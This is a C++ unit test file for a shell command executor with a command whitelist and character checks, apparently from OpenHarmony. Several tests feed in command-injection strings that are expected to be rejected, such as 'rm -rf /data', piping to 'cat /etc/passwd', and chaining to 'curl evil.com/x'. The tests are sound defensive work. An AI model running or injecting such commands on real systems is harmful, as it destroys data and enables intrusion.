/*
 * Copyright (c) 2023 Huawei Device Co., Ltd.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <gtest/gtest.h>

#define private public
#include "shell_command_config_loader.h"
#include "shell_command_executor.h"
#undef private

using namespace testing::ext;
using namespace OHOS;
using namespace OHOS::AAFwk;

namespace {
const int64_t TIMEOUT = 1;
const std::string CMD = "ls";
const std::string TEST_WHITELIST_CMD = "aa";
}  // namespace

class ShellCommandExecutorTest : public ::testing::Test {
public:
    static void SetUpTestCase();
    static void TearDownTestCase();
    void SetUp() override;
    void TearDown() override;
    std::shared_ptr<ShellCommandExecutor> Command_;
};

void ShellCommandExecutorTest::SetUpTestCase()
{
    ShellCommandConfigLoader::commands_.emplace(TEST_WHITELIST_CMD);
}

void ShellCommandExecutorTest::TearDownTestCase()
{}

void ShellCommandExecutorTest::SetUp()
{
    Command_ = std::make_shared<ShellCommandExecutor>(CMD, TIMEOUT);
}

void ShellCommandExecutorTest::TearDown()
{}

/**
 * @tc.number: ShellCommandExecutor_DoWork_0100
 * @tc.name: DoWork
 * @tc.desc: Verify cmd_ When it is null, calling DoWork function returns false.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_DoWork_0100, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_DoWork_0100 start";
    Command_->cmd_ = "";
    EXPECT_EQ(Command_->DoWork(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_DoWork_0100 end";
}

/**
 * @tc.number: ShellCommandExecutor_DoWork_0200
 * @tc.name: DoWork
 * @tc.desc: Verify the handler_ When it is nullptr, calling DoWork function returns false.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_DoWork_0200, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_DoWork_0200 start";
    Command_->handler_ = nullptr;
    EXPECT_EQ(Command_->DoWork(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_DoWork_0200 end";
}

/**
 * @tc.number: ShellCommandExecutor_DoWork_0300
 * @tc.name: DoWork
 * @tc.desc: Verify that DoWork returns true when cmd_ is valid and passes CheckCommand.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_DoWork_0300, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_DoWork_0300 start";
    Command_->cmd_ = TEST_WHITELIST_CMD;
    EXPECT_EQ(Command_->DoWork(), true);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_DoWork_0300 end";
}

/**
 * @tc.number: ShellCommandExecutor_DoWork_0400
 * @tc.name: DoWork
 * @tc.desc: Verify that DoWork returns false when cmd_ fails CheckCommand (not in whitelist).
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_DoWork_0400, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_DoWork_0400 start";
    Command_->cmd_ = "CMD12";
    EXPECT_EQ(Command_->DoWork(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_DoWork_0400 end";
}

/**
 * @tc.number: ShellCommandExecutor_WaitWorkDone_0100
 * @tc.name: WaitWorkDone
 * @tc.desc: Verify that WaitWorkDone returns early when DoWork fails due to CheckCommand rejection.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_WaitWorkDone_0100, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_WaitWorkDone_0100 start";
    ASSERT_NE(Command_, nullptr);
    Command_->timeoutSec_ = -1;
    Command_->cmdResult_.exitCode = 0;
    auto result = Command_->WaitWorkDone();
    EXPECT_EQ(result.exitCode, 0);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_WaitWorkDone_0100 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_0100
 * @tc.name: CheckCommand
 * @tc.desc: Verify that a command with a whitelisted first word and all allowed characters passes CheckCommand.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_0100, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0100 start";
    Command_->cmd_ = "aa start -b com.example -a EntryAbility";
    EXPECT_EQ(Command_->CheckCommand(), true);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0100 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_0200
 * @tc.name: CheckCommand
 * @tc.desc: Verify that a command whose first word is not in the whitelist is rejected by CheckCommand.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_0200, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0200 start";
    Command_->cmd_ = "rm -rf /data";
    EXPECT_EQ(Command_->CheckCommand(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0200 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_0300
 * @tc.name: CheckCommand
 * @tc.desc: Verify that shell metacharacter ';' injection is rejected by CheckCommand character validation.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_0300, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0300 start";
    Command_->cmd_ = "aa ; rm -rf /data";
    EXPECT_EQ(Command_->CheckCommand(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0300 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_0400
 * @tc.name: CheckCommand
 * @tc.desc: Verify that shell metacharacter '|' pipe injection is rejected by CheckCommand character validation.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_0400, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0400 start";
    Command_->cmd_ = "aa | cat /etc/passwd";
    EXPECT_EQ(Command_->CheckCommand(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0400 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_0500
 * @tc.name: CheckCommand
 * @tc.desc: Verify that shell metacharacter '$()' command substitution injection is rejected by CheckCommand.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_0500, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0500 start";
    Command_->cmd_ = "aa $(rm -rf /data)";
    EXPECT_EQ(Command_->CheckCommand(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0500 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_0600
 * @tc.name: CheckCommand
 * @tc.desc: Verify that shell metacharacter '&&' chain injection is rejected by CheckCommand character validation.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_0600, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0600 start";
    Command_->cmd_ = "aa && curl evil.com/x -o /tmp/x";
    EXPECT_EQ(Command_->CheckCommand(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0600 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_0700
 * @tc.name: CheckCommand
 * @tc.desc: Verify that shell metacharacter '>' redirect injection is rejected by CheckCommand character validation.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_0700, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0700 start";
    Command_->cmd_ = "aa > /data/local/tmp/mal";
    EXPECT_EQ(Command_->CheckCommand(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0700 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_0800
 * @tc.name: CheckCommand
 * @tc.desc: Verify that shell metacharacter backtick command substitution injection is rejected by CheckCommand.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_0800, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0800 start";
    Command_->cmd_ = "aa `rm -rf /data`";
    EXPECT_EQ(Command_->CheckCommand(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0800 end";
}

/**
 * @tc.number: ShellCommandExecutor_IsAllowedChar_0100
 * @tc.name: IsAllowedChar
 * @tc.desc: Verify that all allowed characters return true.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_IsAllowedChar_0100, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_IsAllowedChar_0100 start";
    std::string allowedChars = "abcXYZ0123_-. /\t#:=";
    for (char c : allowedChars) {
        EXPECT_EQ(Command_->IsAllowedChar(c), true);
    }
    GTEST_LOG_(INFO) << "ShellCommandExecutor_IsAllowedChar_0100 end";
}

/**
 * @tc.number: ShellCommandExecutor_IsAllowedChar_0200
 * @tc.name: IsAllowedChar
 * @tc.desc: Verify that all forbidden shell metacharacters (;|&$><()!`\"'\) return false.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_IsAllowedChar_0200, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_IsAllowedChar_0200 start";
    std::string forbiddenChars = ";|&$><()!`\"'\\";
    for (char c : forbiddenChars) {
        EXPECT_EQ(Command_->IsAllowedChar(c), false);
    }
    GTEST_LOG_(INFO) << "ShellCommandExecutor_IsAllowedChar_0200 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_0900
 * @tc.name: CheckCommand
 * @tc.desc: Verify that 'aa test' command with '#' test method separator passes CheckCommand.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_0900, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0900 start";
    Command_->cmd_ = "aa test -m entry_test -b com.example.aacommandrelyhap "
        "-s class AACommandTest#ACTS_AACommand_finish_01_0100 -s unittest OpenHarmonyTestRunner";
    EXPECT_EQ(Command_->CheckCommand(), true);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_0900 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_1000
 * @tc.name: CheckCommand
 * @tc.desc: Verify that 'aa start' command with URI containing ':' passes CheckCommand.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_1000, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1000 start";
    Command_->cmd_ = "aa start -A ohos.want.action.select -U https://valid.uri.com";
    EXPECT_EQ(Command_->CheckCommand(), true);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1000 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_1100
 * @tc.name: CheckCommand
 * @tc.desc: Verify that 'aa start' command with '=' in parameter value passes CheckCommand.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_1100, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1100 start";
    Command_->cmd_ = "aa start --ps key value_with_equals_sign";
    EXPECT_EQ(Command_->CheckCommand(), true);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1100 end";
}

/**
 * @tc.number: ShellCommandExecutor_StripParamQuotes_0100
 * @tc.name: StripParamQuotes
 * @tc.desc: Verify that single-quoted parameter is stripped to its inner content.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_StripParamQuotes_0100, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0100 start";
    EXPECT_EQ(Command_->StripParamQuotes("aa start -p 'aabbccdd'"), "aa start -p aabbccdd");
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0100 end";
}

/**
 * @tc.number: ShellCommandExecutor_StripParamQuotes_0200
 * @tc.name: StripParamQuotes
 * @tc.desc: Verify that double-quoted parameter is stripped to its inner content.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_StripParamQuotes_0200, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0200 start";
    EXPECT_EQ(Command_->StripParamQuotes("aa start -U \"https://uri.com\""), "aa start -U https://uri.com");
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0200 end";
}

/**
 * @tc.number: ShellCommandExecutor_StripParamQuotes_0300
 * @tc.name: StripParamQuotes
 * @tc.desc: Verify that unquoted parameter remains unchanged after stripping.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_StripParamQuotes_0300, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0300 start";
    EXPECT_EQ(Command_->StripParamQuotes("aa start -p aabbccdd"), "aa start -p aabbccdd");
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0300 end";
}

/**
 * @tc.number: ShellCommandExecutor_StripParamQuotes_0400
 * @tc.name: StripParamQuotes
 * @tc.desc: Verify that double-quoted token containing inner single quote strips only outer double quotes.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_StripParamQuotes_0400, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0400 start";
    EXPECT_EQ(Command_->StripParamQuotes("aa start -p \"hello'world\""), "aa start -p hello'world");
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0400 end";
}

/**
 * @tc.number: ShellCommandExecutor_StripParamQuotes_0500
 * @tc.name: StripParamQuotes
 * @tc.desc: Verify that unmatched quote token is not stripped.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_StripParamQuotes_0500, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0500 start";
    EXPECT_EQ(Command_->StripParamQuotes("aa start -p \"hello"), "aa start -p \"hello");
    GTEST_LOG_(INFO) << "ShellCommandExecutor_StripParamQuotes_0500 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_1200
 * @tc.name: CheckCommand
 * @tc.desc: Verify that command with single-quoted parameter passes CheckCommand after quote stripping.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_1200, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1200 start";
    Command_->cmd_ = "aa start -a EntryAbility -b com.example.actsability -p 'aabbccdd'";
    EXPECT_EQ(Command_->CheckCommand(), true);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1200 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_1300
 * @tc.name: CheckCommand
 * @tc.desc: Verify that command with double-quoted URI parameter passes CheckCommand after quote stripping.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_1300, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1300 start";
    Command_->cmd_ = "aa start -U \"https://uri.com\" -t uri-type";
    EXPECT_EQ(Command_->CheckCommand(), true);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1300 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_1400
 * @tc.name: CheckCommand
 * @tc.desc: Verify that injection inside single quotes is still rejected after quote stripping.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_1400, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1400 start";
    Command_->cmd_ = "aa start -p ';rm -rf /data'";
    EXPECT_EQ(Command_->CheckCommand(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1400 end";
}

/**
 * @tc.number: ShellCommandExecutor_CheckCommand_1500
 * @tc.name: CheckCommand
 * @tc.desc: Verify that injection outside quoted parameters is still rejected by CheckCommand.
 */
HWTEST_F(ShellCommandExecutorTest, ShellCommandExecutor_CheckCommand_1500, TestSize.Level1)
{
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1500 start";
    Command_->cmd_ = "aa start -p 'hello' ; rm -rf /data";
    EXPECT_EQ(Command_->CheckCommand(), false);
    GTEST_LOG_(INFO) << "ShellCommandExecutor_CheckCommand_1500 end";
}